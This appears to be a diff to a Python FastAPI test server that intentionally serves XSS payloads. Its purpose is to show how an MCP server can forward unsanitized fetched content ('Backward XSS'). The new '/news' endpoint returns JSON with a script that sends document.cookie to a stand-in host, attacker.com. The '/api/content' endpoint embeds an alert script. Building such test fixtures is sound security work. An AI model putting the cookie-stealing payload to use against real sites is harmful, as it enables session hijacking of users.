@@ -47,7 +47,9 @@ async def root():
             "/page": "HTML page with inline script tags",
             "/widget": "HTML widget with event handlers",
             "/embed": "HTML with inline event handlers",
-            "/marker": "HTML with obvious XSS marker for testing"
+            "/marker": "HTML with obvious XSS marker for testing",
+            "/news": "JSON response with XSS payload in content field",
+            "/api/content": "API endpoint returning JSON with XSS in body field"
         },
         "warning": "Content should be sanitized before embedding!"
     }
@@ -217,6 +219,47 @@ async def xss_marker():
 </html>'''
     
     return HTMLResponse(content=html_content)
+
+
+@app.get("/news")
+async def xss_news_json():
+    """
+    JSON endpoint that returns news content with XSS payload
+    
+    This endpoint returns JSON that contains HTML/JavaScript in the content field.
+    When the MCP server fetches this and forwards it without sanitization,
+    it demonstrates Backward XSS via JSON responses.
+    """
+    return {
+        "title": "Latest News",
+        "content": "Here is the latest news... <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
+        "author": "News Service",
+        "date": datetime.now().isoformat(),
+        "note": "This JSON contains HTML/JavaScript in the content field"
+    }
+
+
+@app.get("/api/content")
+async def xss_api_content():
+    """
+    API endpoint that returns JSON with XSS payload in content
+    
+    Simulates a legitimate API that returns content with embedded HTML/JavaScript.
+    """
+    return {
+        "status": "success",
+        "data": {
+            "id": 1,
+            "type": "article",
+            "title": "Legitimate Article",
+            "body": "<p>This is legitimate content.</p><script>alert('XSS via JSON API!')</script><p>More content here.</p>",
+            "tags": ["news", "technology"]
+        },
+        "meta": {
+            "timestamp": datetime.now().isoformat(),
+            "version": "1.0"
+        }
+    }
 
 
 @app.get("/logs")
